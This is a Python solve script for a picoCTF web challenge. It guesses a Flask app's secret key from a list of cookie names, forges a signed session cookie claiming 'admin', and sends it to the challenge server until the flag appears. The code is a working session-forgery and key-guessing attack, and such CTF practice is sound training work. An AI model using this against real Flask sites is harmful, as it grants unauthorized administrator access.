import requests
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

cookie_names = [
    "snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter",
    "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint",
    "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron",
    "black and white", "white chocolate macadamia"
]

# 🟡 Đổi URL này thành nơi bạn host app Flask
TARGET_URL = "http://mercury.picoctf.net:44693/display"  # Hoặc IP server public nếu có

class CookieCracker:
    def __init__(self, secret_key):
        self.app = Flask(__name__)
        self.app.secret_key = secret_key
        self.serializer = SecureCookieSessionInterface().get_signing_serializer(self.app)

    def forge_cookie(self, data):
        return self.serializer.dumps(data)

for key in cookie_names:
    try:
        cracker = CookieCracker(secret_key=key)
        cookie = cracker.forge_cookie({"very_auth": "admin"})

        cookies = {"session": cookie}
        print(f"[ ] Trying key: {key}")
        res = requests.get(TARGET_URL, cookies=cookies)

        if "picoCTF" in res.text or "flag" in res.text.lower():
            print(f"\n[✅] Found key: {key}")
            print(f"[🍪] Session cookie: {cookie}")
            print(f"[📜] Flag page content:\n{res.text}")
            break
    except Exception as e:
        print(f"[-] Error with key {key}: {e}")
